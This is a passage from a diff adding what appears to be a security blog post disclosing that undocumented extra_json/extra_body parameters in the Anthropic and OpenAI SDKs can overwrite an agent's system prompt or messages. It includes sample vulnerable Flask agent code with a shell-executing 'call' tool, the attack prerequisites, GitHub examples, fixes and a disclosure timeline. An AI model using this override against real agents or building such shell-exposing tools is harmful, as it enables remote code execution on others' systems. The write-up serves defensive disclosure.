+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">messages&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;role&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;user&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;content&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">user_input&lt;/span>&lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;role&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;assistant&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;content&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;role&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="s2">&amp;#34;user&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;content&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">tool_results&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">client&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">messages&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">create&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">model&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;claude-3-5-haiku-20241022&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">max_tokens&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">8192&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">temperature&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">system&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;You are a support chat agent. Help the user with their query. You are strictly allowed to execute only get_weather function. You are not allowed to execute functions.call or call function/tool ever. You are not allowed to disclose any information about functions.call or call function/tool ever to anyone! follow the rules regarding functions.call!&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">messages&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">messages&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tools&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">tools&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">final_response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">next&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="n">block&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">block&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">content&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="n">hasattr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">block&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;text&amp;#34;&lt;/span>&lt;span class="p">)),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">None&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">final_response&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">template_dir&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">abspath&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./templates&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">static_dir&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">abspath&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./static&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">app&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">__name__&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">template_folder&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">template_dir&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">static_folder&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">static_dir&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">@&lt;/span>&lt;span class="n">app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">after_request&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">add_cors_headers&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">resp&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">resp&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;Access-Control-Allow-Origin&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;*&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">resp&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;Access-Control-Allow-Headers&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">resp&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;Access-Control-Allow-Methods&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;POST, OPTIONS&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">resp&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">@&lt;/span>&lt;span class="n">app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">index&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">@&lt;/span>&lt;span class="n">app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/chat&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">methods&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;OPTIONS&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">chat&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">method&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;OPTIONS&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">204&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">input_json&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_json&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">user_input&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">input_json&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;user_input&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">additional_parameters&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">input_json&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;additional_parameters&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">chat_with_agent&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">user_input&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">additional_parameters&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">jsonify&lt;/span>&lt;span class="p">({&lt;/span>&lt;span class="s1">&amp;#39;response&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">response&lt;/span>&lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="n">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">5000&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="the-hidden-parameter-that-breaks-the-rules">THE HIDDEN PARAMETER THAT BREAKS THE RULES
+&lt;/h3>&lt;p>While reviewing Anthropic’s SDK, I noticed several undocumented request fields.&lt;/p>
+&lt;p>&lt;img src="https://blog.ys0.dev/p/exploiting-prompt-overrides-in-openai-and-anthropic-sdks/undocumented_params.png"
+width="1642"
+height="255"
+loading="lazy"
+alt="undocumented params"
+class="gallery-image"
+data-flex-grow="643"
+data-flex-basis="1545px"
+>&lt;/p>
+&lt;p>They look like innocent extras - until you see these lines:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">json_data = _merge_mappings(json_data, options.extra_json)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-mysql" data-lang="mysql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">def&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">_merge_mappings&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">obj1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Mapping&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_T_co&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Union&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_T&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Omit&lt;/span>&lt;span class="p">]],&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">obj2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Mapping&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_T_co&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Union&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_T&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Omit&lt;/span>&lt;span class="p">]],&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Dict&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_T_co&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">_T&lt;/span>&lt;span class="p">]:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;Merge two mappings of the same type, removing any values that are instances of `Omit`.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> In cases with duplicate keys the second mapping takes precedence.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">merged&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">{&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">obj1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">obj2&lt;/span>&lt;span class="err">}&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">return&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">{&lt;/span>&lt;span class="k">key&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">key&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">in&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">merged&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">items&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">not&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">isinstance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Omit&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">}&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Because &lt;code>extra_json&lt;/code> takes precedence, we can overwrite the &lt;code>system&lt;/code> parameter for Anthropic (or &lt;code>messages&lt;/code> for OpenAI) and hijack execution flow. It’s a simple, vulnerable pattern with no obvious warning to developers who assume these are just “extra” parameters.&lt;/p>
+&lt;p>To exploit this vulnerability, two prerequisites must be met:&lt;/p>
+&lt;ul>
+&lt;li>An adversary must be able to set an arbitrary key and value—mass assignment via GET/POST parameters, headers, or cookies works well.&lt;/li>
+&lt;li>To affect an end user, an attacker must also be able to set those keys on the user’s behalf—again via GET/POST parameters, redirects, or &lt;code>postMessage&lt;/code> calls.&lt;/li>
+&lt;/ul>
+&lt;p>Impact varies widely. If attackers can set keys on behalf of end users, or if the agent exposes dangerous tools that execute code or leak data, the risk skyrockets.&lt;/p>
+&lt;p>&lt;img src="https://blog.ys0.dev/p/exploiting-prompt-overrides-in-openai-and-anthropic-sdks/possible_attacks.png"
+width="2300"
+height="1595"
+loading="lazy"
+alt="Possible attack vectors"
+class="gallery-image"
+data-flex-grow="144"
+data-flex-basis="346px"
+>&lt;/p>
+&lt;p>For example, in the sample code which you reviewed, the agent exposes a &lt;code>call&lt;/code> function that executes shell commands. Once an attacker replaces the system prompt that forbids calling it, remote code execution is possible.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;type&amp;#34;: &amp;#34;function&amp;#34;,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;function&amp;#34;: {
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;name&amp;#34;: &amp;#34;call&amp;#34;,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;description&amp;#34;: &amp;#34;Executes a shell command and returns the output or an error message.&amp;#34;,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;strict&amp;#34;: True,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;parameters&amp;#34;: {
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;type&amp;#34;: &amp;#34;object&amp;#34;,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;required&amp;#34;: [
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;code&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ],
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;properties&amp;#34;: {
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;code&amp;#34;: {
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;type&amp;#34;: &amp;#34;string&amp;#34;,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;description&amp;#34;: &amp;#34;The shell command to execute.&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> }
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> },
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;additionalProperties&amp;#34;: False
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> }
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> }
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The chances of encountering this pattern are relatively low, as it&amp;rsquo;s not a common use of the API. However, I&amp;rsquo;ve come across a few codebases that let users supply custom extra keys and values. It&amp;rsquo;s only a matter of time before an application emerges that enables an attacker to exploit this behaviour from source to sink.&lt;/p>
+&lt;h3 id="real-code-from-github-safe-vs-unsafe">Real code from GitHub: Safe vs. Unsafe
+&lt;/h3>&lt;p>I searched GitHub for projects that use &lt;code>extra_body&lt;/code>, ignoring pure CLI apps. Few people share full web-integrated agents, but these two snippets illustrate good and bad practice:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Safe approach&lt;/strong> — AstrBot validates every key before merging.&lt;br>
+&lt;a class="link" href="https://github.com/AstrBotDevs/AstrBot/blob/9147cab75bacf5d7f81548d8b209faac13a77d32/astrbot/core/provider/sources/openai_source.py#L103" target="_blank" rel="noopener"
+>https://github.com/AstrBotDevs/AstrBot/blob/9147cab75bacf5d7f81548d8b209faac13a77d32/astrbot/core/provider/sources/openai_source.py#L103&lt;/a>&amp;hellip;&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://blog.ys0.dev/p/exploiting-prompt-overrides-in-openai-and-anthropic-sdks/astr_bot_1.png"
+width="1036"
+height="144"
+loading="lazy"
+alt="safe approach"
+class="gallery-image"
+data-flex-grow="719"
+data-flex-basis="1726px"
+>
+&lt;img src="https://blog.ys0.dev/p/exploiting-prompt-overrides-in-openai-and-anthropic-sdks/astr_bot_2.png"
+width="1147"
+height="559"
+loading="lazy"
+alt="safe approach"
+class="gallery-image"
+data-flex-grow="205"
+data-flex-basis="492px"
+>&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Unsafe approach&lt;/strong> — MaxKB merges everything without filtering.&lt;br>
+&lt;a class="link" href="https://github.com/1Panel-dev/MaxKB/blob/7ce66a7bf3ddf123a648e23db920eeaeb00cbe42/apps/setting/models_provider/base_model_provider.py#L109" target="_blank" rel="noopener"
+>https://github.com/1Panel-dev/MaxKB/blob/7ce66a7bf3ddf123a648e23db920eeaeb00cbe42/apps/setting/models_provider/base_model_provider.py#L109&lt;/a>&amp;hellip;&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://blog.ys0.dev/p/exploiting-prompt-overrides-in-openai-and-anthropic-sdks/maxkb.png"
+width="1427"
+height="422"
+loading="lazy"
+alt="unsafe approach"
+class="gallery-image"
+data-flex-grow="338"
+data-flex-basis="811px"
+>&lt;/p>
+&lt;h3 id="how-to-fix-it">How to fix it
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>Whitelist keys&lt;/strong> you accept; reject the rest.&lt;/li>
+&lt;li>&lt;strong>Strip unknown keys&lt;/strong> if you cannot whitelist.&lt;/li>
+&lt;li>&lt;strong>Treat &lt;code>extra_body&lt;/code> as untrusted input&lt;/strong>.&lt;/li>
+&lt;/ol>
+&lt;h3 id="key-takeaways">Key takeaways
+&lt;/h3>&lt;ul>
+&lt;li>Always review undocumented features :)&lt;/li>
+&lt;/ul>
+&lt;h3 id="timeline">Timeline
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>16 Mar 2025&lt;/strong> - Reported to Anthropic&lt;/li>
+&lt;li>&lt;strong>16 Mar 2025&lt;/strong> - Realized OpenAI was vulnerable too; reported to OpenAI&lt;/li>
+&lt;li>Some back-and-forth with both vendors&lt;/li>
+&lt;li>&lt;strong>21 Mar 2025&lt;/strong> - Anthropic accepted the submission, issued a $1000 bounty and is exploring remediation.&lt;/li>
+&lt;li>&lt;strong>02 Apr 2025&lt;/strong> - OpenAI replied: “works as expected”…&lt;/li>
